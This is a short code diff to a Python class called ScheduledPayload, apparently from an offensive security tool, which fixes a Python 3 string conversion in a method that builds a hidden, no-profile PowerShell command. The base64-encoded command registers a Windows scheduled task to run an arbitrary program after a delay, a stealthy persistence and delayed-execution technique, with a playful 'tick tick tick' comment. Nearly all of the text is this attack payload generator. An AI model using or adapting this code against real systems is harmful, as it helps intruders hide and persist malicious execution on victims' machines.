@@ -14,7 +14,7 @@ class ScheduledPayload(object):
 
     def execute(self):
 
-        return 'powershell.exe -nop -w hidden -encodedCommand '+base64.b64encode(('''ipmo ScheduledTasks
+        return 'powershell.exe -nop -w hidden -encodedCommand '+str(base64.b64encode(('''ipmo ScheduledTasks
 $action = New-ScheduledTaskAction -Execute '%s' -Argument '%s'
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(%d) # tick tick tick ;)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "%s" -Description "%s"''' % (self.command, self.args, self.delay, self.taskname, self.description)).encode('utf-16-le'))
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "%s" -Description "%s"''' % (self.command, self.args, self.delay, self.taskname, self.description)).encode('utf-16-le')))
